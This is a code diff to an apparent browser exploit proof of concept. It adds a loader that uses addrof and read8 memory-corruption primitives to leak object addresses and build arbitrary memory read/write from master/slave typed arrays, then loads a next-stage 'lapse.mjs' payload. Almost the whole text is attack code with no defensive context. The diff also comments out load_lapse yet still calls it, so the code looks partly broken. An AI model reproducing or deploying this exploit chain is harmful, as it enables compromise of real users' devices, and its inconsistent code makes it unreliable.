@@ -396,6 +396,45 @@ function poc() {
     m[7] = 1;
 
 
+
+ const loader = document.createElement('script');
+  loader.type = 'module';
+  loader.textContent = `
+    import * as mem from './module/mem.mjs';
+    import * as imod from './module/int64.mjs';
+    window.__exploit_mem = mem;
+    window.__exploit_imod = imod;
+  `;
+  document.head.appendChild(loader);
+
+loader.onload = () => {
+    const { Memory } = window.__exploit_mem;
+    const { Int: Int64 } = window.__exploit_imod;
+    const prim     = window.p;
+    const addrofFn = window.addrof;
+
+    function read64(addr) {
+      const data = prim.read8(addr);
+      return new Int64(data.low, data.hi);
+    }
+ 
+    const expl_master = new Uint32Array(new ArrayBuffer(32));
+    const expl_slave  = new DataView(new ArrayBuffer(16));
+
+    let obj = { addr: null, 0: 0 };
+    let objAddr = addrofFn(obj);
+    let rawBt   = read64(objAddr.add(8));
+
+    let objP  = new Int64(objAddr.low, objAddr.hi);
+    let objBT = new Int64(rawBt.low, rawBt.hi);
+
+    new Memory(expl_master, expl_slave, obj, objP.add(0x10), objBT);
+
+    const lapseScript = document.createElement('script');
+    lapseScript.type = 'module';
+    lapseScript.src  = './lapse.mjs';
+    document.head.appendChild(lapseScript);
+  };
 /*async function load_lapse(){
 	   
         let mod = await import('./module/mem.mjs');
@@ -410,7 +449,7 @@ function poc() {
         import('./lapse.mjs');
     }*/
 	
-async function load_lapse() {
+/*async function load_lapse() {
    
     let mod = await import('./module/mem.mjs');
     let imod = await import('./module/int64.mjs');
@@ -443,7 +482,7 @@ async function load_lapse() {
 	
     await import('./lapse.mjs');
 }
-
+*/
     load_lapse();
 	return;
 
